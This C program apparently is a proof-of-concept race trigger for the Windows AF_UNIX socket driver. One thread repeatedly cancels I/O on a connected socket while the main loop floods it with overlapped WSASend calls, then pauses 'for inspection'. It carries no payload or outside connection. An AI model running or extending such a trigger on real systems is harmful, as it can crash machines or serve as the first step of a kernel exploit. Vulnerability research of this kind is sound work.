#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct sockaddr_un {
    unsigned short sun_family;
    char sun_path[108];
};

#define SOCK_PATH "C:\\Temp\\afunix_test.sock"
#define BIG_BUF 65536
#define NUM_OVERLAPPED 64

SOCKET g_conn = INVALID_SOCKET;
volatile int g_stop = 0;

DWORD WINAPI CancelThread(LPVOID param) {
    printf("[*] Cancel thread started\n");
    while (!g_stop) {
        CancelIoEx((HANDLE)g_conn, NULL);
        Sleep(1);
    }
    printf("[*] Cancel thread done\n");
    return 0;
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    CreateDirectoryA("C:\\Temp", NULL);

    SOCKET srv = WSASocketA(AF_UNIX, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (srv == INVALID_SOCKET) {
        printf("[-] socket(srv) failed: %d\n", WSAGetLastError());
        return 1;
    }

    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path)-1);

    DeleteFileA(SOCK_PATH);
    if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        printf("[-] bind failed: %d\n", WSAGetLastError());
        return 1;
    }
    listen(srv, 1);
    printf("[+] listening\n");

    SOCKET cli = WSASocketA(AF_UNIX, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);
    connect(cli, (struct sockaddr*)&addr, sizeof(addr));
    g_conn = accept(srv, NULL, NULL);
    printf("[+] connected\n");

    HANDLE ct = CreateThread(NULL, 0, CancelThread, NULL, 0, NULL);

    char *buf = calloc(BIG_BUF, 1);
    memset(buf, 'A', BIG_BUF);

    OVERLAPPED ov[NUM_OVERLAPPED] = {0};
    WSABUF wb[NUM_OVERLAPPED];
    HANDLE events[NUM_OVERLAPPED];

    for (int i = 0; i < NUM_OVERLAPPED; i++) {
        events[i] = CreateEvent(NULL, TRUE, FALSE, NULL);
        ov[i].hEvent = events[i];
        wb[i].buf = buf;
        wb[i].len = BIG_BUF;
    }

    printf("[*] Posting overlapped sends while cancel thread runs...\n");

    for (int round = 0; round < 1000; round++) {
        for (int i = 0; i < NUM_OVERLAPPED; i++) {
            ResetEvent(events[i]);
            memset(&ov[i], 0, sizeof(OVERLAPPED));
            ov[i].hEvent = events[i];
            DWORD sent = 0;
            WSASend(cli, &wb[i], 1, &sent, 0, &ov[i], NULL);
        }
        Sleep(1);
    }

    g_stop = 1;
    WaitForSingleObject(ct, 3000);

    printf("[+] Done, sleeping for inspection...\n");
    Sleep(10000);

    free(buf);
    for (int i = 0; i < NUM_OVERLAPPED; i++)
        CloseHandle(events[i]);
    closesocket(g_conn);
    closesocket(cli);
    closesocket(srv);
    DeleteFileA(SOCK_PATH);
    WSACleanup();
    return 0;
}